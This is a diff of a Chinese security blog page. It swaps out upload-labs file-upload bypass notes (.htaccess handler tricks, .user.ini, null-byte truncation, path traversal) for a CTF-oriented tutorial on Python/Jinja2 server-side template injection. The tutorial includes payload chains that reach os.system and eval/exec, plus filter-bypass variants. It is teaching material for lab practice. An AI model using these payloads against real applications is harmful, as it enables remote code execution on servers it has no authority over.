@@ -24,7 +24,7 @@
 
   
 
-  <title>upload-labs | 逃离失眠</title>
+  <title>ssti初识 | 逃离失眠</title>
 
   
 
@@ -101,17 +101,12 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">upload-labs</h1>
+          <h1 class="title-wrap">ssti初识</h1>
           <h2 class="title-sub-wrap">
             <strong>Ins0mn1a93</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2024-10-23T11:26:10.000Z" itemprop="datePublished">2024-10-23</time>
+            <time  class="article-date" datetime="2024-12-05T06:28:38.000Z" itemprop="datePublished">2024-12-05</time>
           </h2>
-          
-            <h2 class="last-time">
-              <span>最后更新于</span>
-              <time  class="article-updated" datetime="2024-11-29T00:26:07.000Z" itemprop="dateUpdated">2024-11-29</time>
-            </h2>
           
           
           <ul class="wrap-list dark">
@@ -141,64 +136,130 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h1>从upload-labs学文件上传</h1>
-<p>进度呢都是根据upload-labs来的，当然如果在真实渗透中也有遇到这种题目并且有另外的思路也拿过来说说（我电脑不知道怎么肥事，怎么连本地的文件上传的包都抓不了，过于抽象，只能用用NSSCTF平台来做做了）</p>
-<h2 id="less-1"><a class="header-anchor" href="#less-1">¶</a>less-1</h2>
-<p>前端无效检测后缀绕过，抓包修改后缀；或者禁用js就行，因为上传文件的逻辑是写在后端的，所以不必担心上传功能被ban</p>
-<h2 id="less-2"><a class="header-anchor" href="#less-2">¶</a>less-2</h2>
-<p>mime+前端后缀检测，跟上题一样，只要注意mime类型就行</p>
-<h2 id="less-3"><a class="header-anchor" href="#less-3">¶</a>less-3</h2>
-<p>过滤了 <code>.jsp</code>，<code>.jspx </code>，<code>.php</code>，用php3、phtml绕过就行，但不知道为什么解析不了</p>
-<p>在网上搜了搜，推测可能是php的配置文件并不支持解析php3，phtml等文件，这里指的应该是<code>.htaccess</code>文件（apache的）</p>
-<h2 id="less-4"><a class="header-anchor" href="#less-4">¶</a>less-4</h2>
-<p>这里把php以及其他能够解析成php文件的后缀给过滤掉了，由于系统用的是黑名单，所以可以尝试上传<code>.htaccess</code>文件，写入：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
-<p>意为将<code>.jpg</code>当做php文件进行解析处理，解析之后发现还真行</p>
-<p><img src="image-20241023202054901.png" alt="image-20241023202054901"></p>
-<h2 id="less-5"><a class="header-anchor" href="#less-5">¶</a>less-5</h2>
-<p>过滤了<code>.htaccess</code>，那也许就是用<code>.user.ini</code>文件了（但是不行，看下文笔记），传一个</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=<span class="string">&quot;1.jpg&quot;</span></span><br><span class="line">auto_append_file=<span class="string">&quot;1.jpg&quot;</span></span><br></pre></td></tr></table></figure>
-<p>这俩的区别在于执行的先后，<code>auto_prepend_file</code>在php执行前就会被包含，一般用于初始化；<code>auto_append_file</code>则用于php执行结束之后，一般用于善后。</p>
-<p>当然了，这题还有一种绕过就是大小写绕过，有点抽象了，前几题都有<code>$file_ext = strtolower($file_ext);</code>，但这题就不知道跑哪去了</p>
+        <blockquote>
+<p>[!IMPORTANT]</p>
+<p>漏洞讲解部分以Python语句为例</p>
+</blockquote>
+<h1>初识模版引擎</h1>
+<h2 id="先来谈谈什么是模版引擎吧"><a class="header-anchor" href="#先来谈谈什么是模版引擎吧">¶</a>先来谈谈什么是模版引擎吧</h2>
+<p>在早期开发中，逻辑和页面内容通常会混杂在一起，比如php，它支持前端Javascript直接嵌入到php语句中，这种简单粗暴的方法确实有它的好处，但这样会导致这个php文件既包含业务逻辑，又包含展示逻辑，在维护时会变得很麻烦。</p>
+<p>此外，当你实现多个功能基本相似，但具体内容不同的功能时，复制粘贴固然很好，但也架不住会遇到基本功能也需要上百行代码的编写与实现，也会让维护变得麻烦；</p>
+<p>所以呢，为了让开发的过程更简便，最终的软件更容易维护，模板引擎就应运而生了。</p>
+<p>模版引擎是一种软件工具或库，用于将静态模版与动态数据结合，从而生成最终的动态内容（如网页、文档或其他格式化输出）。模版引擎的核心是将<strong>逻辑</strong>与<strong>表示</strong>分离，通过模版语言来定义页面结构和样式，同时通过数据填充实现动态内容。</p>
+<h2 id="简单说说模板引擎的原理"><a class="header-anchor" href="#简单说说模板引擎的原理">¶</a>简单说说模板引擎的原理</h2>
+<p>数据渲染到模板后进行展示的过程大致如下：</p>
+<p><strong>对模板文件进行读取</strong> -&gt; <strong>通过库中的方法进行解析</strong> -&gt; <strong>将数据与模板里的占位符进行一一对应</strong> -&gt; <strong>执行模板中的逻辑</strong> -&gt; <strong>生成最终输出</strong></p>
+<p>举个例子，前端的模版文件：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>欢迎，&#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    &#123;% for item in items %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; item &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>后端的数据与渲染部分：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;title&quot;</span>: <span class="string">&quot;用户主页&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">        <span class="string">&quot;items&quot;</span>: [<span class="string">&quot;书籍&quot;</span>, <span class="string">&quot;音乐&quot;</span>, <span class="string">&quot;电影&quot;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, **data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="image-20241205151940855.png" alt="image-20241205151940855"></p>
+<h2 id="常见的模版引擎"><a class="header-anchor" href="#常见的模版引擎">¶</a>常见的模版引擎</h2>
+<p>前端：JavaScript的EJS，Vuejs等等</p>
+<p>后端：Java的Thymeleaf（一般用于Springboot），Python的Jinja和Django，PHP的Smarty，Twig</p>
+<h1>模版注入漏洞</h1>
+<p>介绍完模板引擎，接下来就要说说它的漏洞了</p>
+<h2 id="先来说说原理"><a class="header-anchor" href="#先来说说原理">¶</a>先来说说原理</h2>
+<p>我们刚刚提到过，模版引擎会通过数据来生成动态内容，比如用户的信息页面。如果用户特意输入了一个数据，且开发者没有对输入的信息作严格地处理，那么这个数据就会变成模板内容的一部分，模板引擎在进行渲染时会执行数据中的语句，从而导致信息泄露，getshell，代码执行等问题。</p>
+<h2 id="在python中哪些方法会被利用到？"><a class="header-anchor" href="#在python中哪些方法会被利用到？">¶</a>在python中哪些方法会被利用到？</h2>
+<p>python的一些内置函数可供攻击者进行利用（也叫魔术方法）：</p>
+<ul>
+<li><code>__class__</code>：返回一个对象的类，也可以获得该对象的数据类型</li>
+<li><code>__mro__</code>:返回当前类的继承关系，以元组的形式返回</li>
+<li><code>__subclasses__</code>:返回当前类的所有子类，用于进一步利用</li>
+<li><code>__base__</code>:返回当前类的直接父类</li>
+<li><code>__bases__</code>:以元组的形式返回当前类的所有基类</li>
+<li><code>__init__</code>:用于初始化对象，相当于构造函数，便于调用函数并传递命令或其他变量值</li>
+<li><code>__globals__</code>:提供了函数可以访问的所有全局变量和函数的字典</li>
+<li><code>__builtins__</code>:所有Python内置函数和异常的集合，说白了可以调用所有的Python内置函数</li>
+<li><code>__getitem__</code>:通过键来访问对象的元素，相当于访问数组下标来获取对应的值</li>
+<li><code>__import__</code>:用于动态导入模版</li>
+</ul>
+<blockquote>
+<p>[!TIP]</p>
+<p>插个题外话，python的数据结构分为<strong>列表</strong>，<strong>元组</strong>，<strong>字典</strong>，<strong>集合</strong>：</p>
+<ul>
+<li>列表：有序且可变的元素集合，可以包含重复元素；</li>
+<li>元组：有序但不可变的元素集合，可以包含重复元素，相对于列表来说，它是只读的；</li>
+<li>字典：无序但可变的键值对集合，可以包含重复元素（也就是数组），键是唯一的（即一一对应）；</li>
+<li>集合：无序但可变的元素集合，不可以包含重复元素</li>
+</ul>
+</blockquote>
+<h2 id="如何利用这个漏洞呢"><a class="header-anchor" href="#如何利用这个漏洞呢">¶</a>如何利用这个漏洞呢</h2>
+<p>在CTF中，我们的目标是要拿到系统里的flag，所以我们要考虑的是如何执行系统命令。在python中，能够执行系统命令的有如下方法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># os.system</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess.run</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">result = subprocess.run([<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;-l&#x27;</span>], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess.Popen</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">process = subprocess.Popen([<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;-l&#x27;</span>], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="literal">True</span>)</span><br><span class="line">stdout, stderr = process.communicate()</span><br><span class="line"><span class="built_in">print</span>(stdout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.popen</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">print</span>(os.popen(<span class="string">&#x27;ls -l&#x27;</span>).read())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>（可能会有人想到用sh库，但问题是这个库在python里面并不是自带的，你还要下载安装）</p>
+<p>所以我们的目标就成为了如何获取os库并利用system的方法。</p>
+<h3 id="查看对象所属的类"><a class="header-anchor" href="#查看对象所属的类">¶</a>查看对象所属的类</h3>
+<p>在python中，获取一个对象的类：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">对象.__class__</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&#123;&#125;.__class__</span><br><span class="line">().__class__</span><br><span class="line"></span><br><span class="line">也可以是 其他内置方法或参数.__class__</span><br><span class="line">常见的有url_for,lipsum,config</span><br></pre></td></tr></table></figure>
+<h3 id="拿到这个对象的基类"><a class="header-anchor" href="#拿到这个对象的基类">¶</a>拿到这个对象的基类</h3>
+<p>在python中，object是所有类的基类，所有的类默认继承自它：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">对象.__class__.__mro__/__base(s)__</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br></pre></td></tr></table></figure>
+<p><img src="image-20241205164349872.png" alt="image-20241205164349872"></p>
+<h3 id="查询这个基类的子类"><a class="header-anchor" href="#查询这个基类的子类">¶</a>查询这个基类的子类</h3>
+<p>在python中，子类包含了很多可用的内置方法供我们进一步的利用：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对象.__class__.__base__.__subclasses__()</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="comment"># __subclasses__是python中的内置方法，用于获取子类</span></span><br></pre></td></tr></table></figure>
+<p><img src="image-20241205181732199.png" alt="image-20241205181732199"></p>
+<p>（如果我没记错的话不同版本的object的子类还是有点差别的，所以在弄ssti时要具体情况具体分析）</p>
+<h3 id="利用某个子类并将其初始化"><a class="header-anchor" href="#利用某个子类并将其初始化">¶</a>利用某个子类并将其初始化</h3>
+<p>在python中，如果需要利用一个子类时需要将其初始化，因为子类是在父类的基础上对现有功能进行扩展，不定义子类的<code>__init__</code>方法可能会导致子类的属性无法正常设置（就会使用父类的<code>__init__</code>方法)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对象.__class__.__base__.__subclasses__()[xxx].__init__</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line">‘’.__class__.__base__.__subclasses__()[xxx].__init__ <span class="comment"># xxx为下标，__subclasses__()在获取到子类后以列表的形式输出</span></span><br></pre></td></tr></table></figure>
+<h3 id="获取某个方法的全局命名空间"><a class="header-anchor" href="#获取某个方法的全局命名空间">¶</a>获取某个方法的全局命名空间</h3>
+<p>在python中，<code>__globals__</code>用于捕获函数的全局命名空间，由于 <code>__init__</code> 方法是类的实例初始化方法，所以<code>__init__.__globals__</code>返回的实际上是这个类所在的模块的全局变量（即这个类所在的文件的全局变量，全局变量又包括：导入的模块和对象，内置变量，定义于全局的变量，类，全局函数）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对象.__class__.__base__.__subclasses__()[xxx].__init__.__globals__</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[xxx].__init__.__globals__</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>[!NOTE]</p>
-<p>说一句，这里不能用.user.ini，因为这题把小写去掉之后那个该死的<code>$img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</code>又来了，而<code> $file_ext</code>的赋值是<code>strrchr($file_name, '.')</code>，这个意思就是从<code>$file_name</code>找到最后一个出现<code>.</code>的，并返回其最后的部分字符串，所以.ini前面一定会被替换成随机的名字</p>
-<p><img src="image-20241023203827891.png" alt="image-20241023203827891"></p>
-<p>网上能直接上传过去的我猜应该是把<code>$img_path</code>写成这样了：<code>$img_path = UPLOAD_PATH.'/'.$file_name;</code>，所以你在上传成功之后会发现不会改文件名</p>
-<p>不过看下来有的第五关跟咱的不一样，估计是在源代码上做了点手脚，所以会导致有的wp不能拿过来用的情况</p>
+<p>在这一步中，你需要注意以下几点：</p>
+<ol>
+<li>如果你知道这个子类的其他方法时也可以把<code>__init__</code>换成其他方法，但正如之前所说，<code>__init__</code> 方法是类的实例初始化方法，相当于构造函数，是我们一定知道的，但是这个子类方法最开始我们不知道，而且不同的环境中子类中的方法可能也不同，所以我们只能用<code>__init__</code>；</li>
+<li>有的子类的<code>__init__</code>函数不能通过<code>__globals__</code>来获取全局命名空间，因为有的子类的<code>__init__</code>是一个<code>wrapper_descriptor</code>类型，它是一种python的底层实现机制，它不具有普通函数或方法的属性，因为它是在底层C语言实现的，你没法让它来捕获python全局命名空间。像这样的类型还有method-wrapper</li>
+</ol>
+<p>举个例子：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">130</span>):</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">type</span>(<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[i].__init__))</span><br></pre></td></tr></table></figure>
+<p>输出结果是这样的：</p>
+<p><img src="image-20241205180832621.png" alt="image-20241205180832621"></p>
 </blockquote>
-<p><img src="image-20241023205634608.png" alt="image-20241023205634608"></p>
-<p>这里没有成功解析也是跟上面的第三关一样的，可能是配置文件没有写入相关后缀导致其不能够将其解析为php文件</p>
-<h2 id="less-6"><a class="header-anchor" href="#less-6">¶</a>less-6</h2>
-<p>这题有点小意思的，绕过黑名单时可以用空格来进行绕过，即<code>1.php</code> -&gt; <code>1. php</code>，不过还是不能解析成php文件，草</p>
-<p>这里似乎涉及到windows和linux的命名规则，它们在遇到带有空格的文件时会自动将空格去掉（wp如是说）</p>
-<p>但是在经过查资料和拷打gpt后，发现Linux和Windows对空格似乎不是那么重视呢，它是允许空格的存在的，在命令行中也不会对空格进行过滤，无非就是加个引号或者转义符来防止预期文件名和命令输入冲突</p>
-<p><img src="image-20241023212142646.png" alt="image-20241023212142646"></p>
-<h2 id="less-7"><a class="header-anchor" href="#less-7">¶</a>less-7</h2>
-<p>这会儿应该就是可以用<code>.user.ini</code>了，根据<code>$img_path = UPLOAD_PATH.'/'.$file_name;</code>可知，他改回来辣！这下不用复制粘贴了，直接跑到upload找🐴去！​</p>
-<h2 id="less-8"><a class="header-anchor" href="#less-8">¶</a>less-8</h2>
-<p>相较于前几题来说少了一个去除<code>::$DATA</code>动作，根据wp所说，<code>::$DATA</code>是一个替代数据流，根据windows文件系统特性，它在命名文件的时候是不允许包含<code>\ / : * ? “ &lt; &gt; |</code>的，当有文件上传到windows系统时，windows会自动处理这些符号。</p>
-<p><img src="image-20241024164847506.png" alt="image-20241024164847506"></p>
-<p>但值得注意的是，windows是允许空格符存在的，所以在对这些符号进行处理时，windows会自动将其转换为Tab键的输出效果或者一个空格；对于Linux文件系统来说，它是允许<code>:</code>存在的，所以在进行文件上传的时候需要注意一下操作系统。至于其他符号的话呢，它们在Linux各有各的用处，<code>/</code>是用来区分目录和文件的，<code>\</code>一般来说是起着连接作用的，所以你会发现<code>touch 1\2</code>后文件名会变成<code>12</code>…………不多说了</p>
-<p>反正我猜这个容器用的是Linux，不然怎么可能不会去掉<code>:</code>呢。</p>
-<p>这里我也抛出一个疑问：既然windows在命名文件和目录时不允许上述符号的存在，那为什么要用到替代数据流呢？难道是因为<code>$DATA</code>在命令行中被识别为环境变量了？我直接用<code>:</code>不就行了？（虽然有点前言不搭后语）</p>
-<h2 id="less-9"><a class="header-anchor" href="#less-9">¶</a>less-9</h2>
-<p>这题就是在后缀加一个<code>. .</code>就能够上传成功，但是由于系统的诟病，没法直接看到文件是否解析成功</p>
-<h2 id="less-10"><a class="header-anchor" href="#less-10">¶</a>less-10</h2>
-<p>这里做了一定修改，其中文件名称的处理逻辑改为<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>那这个就很好理解了，将含有黑名单的部分替换成空，直接双拼绕过即可（双拼的时候注意位置就行）</p>
-<p><img src="image-20241024205739682.png" alt="image-20241024205739682"></p>
-<p><img src="image-20241024205731270.png" alt="image-20241024205731270"></p>
-<h2 id="less-11"><a class="header-anchor" href="#less-11">¶</a>less-11</h2>
-<p>这里开始用到白名单了，利用截断绕过即可。不过这里文件路径动了些小手脚：<code>$img_path = $_GET['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>，发现save_path是需要我们传上去的，这里用目录穿越到upload即可</p>
-<p>他喵的，这服务器没识别到%00我也是醉了，本地和容器都是一个样，他肯定把<code>1.php%00</code>看成一个目录了草，wp应该是这样的</p>
-<p><img src="image-20241024211732815.png" alt="image-20241024211732815"></p>
-<p>后续我又返回去看了看，NSS的upload-labs用的是5.5.9，但是截断漏洞要求是小于5.3.4（草）</p>
-<h2 id="less-12"><a class="header-anchor" href="#less-12">¶</a>less-12</h2>
-<p>跟11题一个样</p>
-<h2 id="less-13"><a class="header-anchor" href="#less-13">¶</a>less-13</h2>
-<p>这里就是文件头检测了，具体代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里不再写labs了，有点缺陷，后续放在ctfshow了。</p>
+<h3 id="获取全局变量中的builtins的相关函数"><a class="header-anchor" href="#获取全局变量中的builtins的相关函数">¶</a>获取全局变量中的builtins的相关函数</h3>
+<p>在python中，<code>__builtins__</code>是一个特殊的变量，用于访问内置模块<code>builtins</code>，其包含了所有的内置函数，异常和常量。刚好，我们的全局命名空间也肯定是有这个的：</p>
+<p><img src="image-20241205181641437.png" alt="image-20241205181641437"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对象.__class__.__base__.__subclasses__()[xxx].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[xxx].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>] <span class="comment"># 其实你从图中就可以发现，&#x27;&#x27;.__class__.__base__.__subclasses__()[xxx].__init__.__globals__的类型实际上是一个字典，__builtins__即是其中的一个键</span></span><br></pre></td></tr></table></figure>
+<p><img src="image-20241205182412369.png" alt="image-20241205182412369"></p>
+<p>也正如刚刚所说，我们看到builtins模版有内置函数，异常和常量，而我们要用到的eval，exec就在这里面</p>
+<h3 id="利用eval，exec执行python语句"><a class="header-anchor" href="#利用eval，exec执行python语句">¶</a>利用eval，exec执行python语句</h3>
+<p>在python中，eval通常用作计算式子的，当然也可以执行Python中的任意代码，exec也是如此，所以我们可以这样利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">对象.__class__.__base__.__subclasses__()[xxx].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;].(式子)</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line">&#x27;&#x27;.__class__.__base__.__subclasses__()[xxx].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;)</span><br><span class="line"># 至于式子为什么要写成里面的那样，那是因为eval只能执行单个语句，不支持像import os;os.system(&#x27;ls&#x27;)这样的一句话木马（因为跟c一样，;代表着这句话的结束。__import__则是一个内置方法或函数，可以像import那样导入想要的模块</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;.__class__.__base__.__subclasses__()[xxx].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;)</span><br><span class="line">&#x27;&#x27;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&quot;import os;os.system(&#x27;ls&#x27;)&quot;)</span><br><span class="line"># exec跟eval的区别就体现出来了，它是支持一句话木马的</span><br></pre></td></tr></table></figure>
+<h1>利用时需要注意的点：</h1>
+<h2 id="过滤了"><a class="header-anchor" href="#过滤了">¶</a>过滤了.</h2>
+<p><code>.</code>的作用是属性访问，如果学了类和结构体的话你也会清楚它的作用的。</p>
+<p>如果被过滤了可以用这个：<code>attr()</code></p>
+<p><code>attr()</code>是Jinja2的原生函数，也是一种过滤器，作用是获取对象的属性，跟<code>getattr()</code>差不多</p>
+<p><code>''.__class__</code>  =&gt;  <code>''|attr('__class__')</code></p>
+<h2 id="过滤了-v2"><a class="header-anchor" href="#过滤了-v2">¶</a>过滤了[]</h2>
+<p>这个就相当于限制了下标的使用，不过我们可以用<code>__getitem__()</code>，它也是Python中的一个魔术方法，作用跟<code>[]</code>一样，输入下标即可</p>
+<p>当然了，pop也可以，它跟<code>__getitem__</code>的区别是，它是移除列表中指定元素并将其返回，它不影响我们后续的访问</p>
+<p><code>''.__class__.__base__.__subclasses__()[128]</code>  =&gt;  <code>''.__class__.__base__.__subclasses__().__getitem__(128)</code></p>
+<p><code>''.__class__.__base__.__subclasses__()[128]</code>  =&gt;  <code>''.__class__.__base__.__subclasses__().pop(128)</code></p>
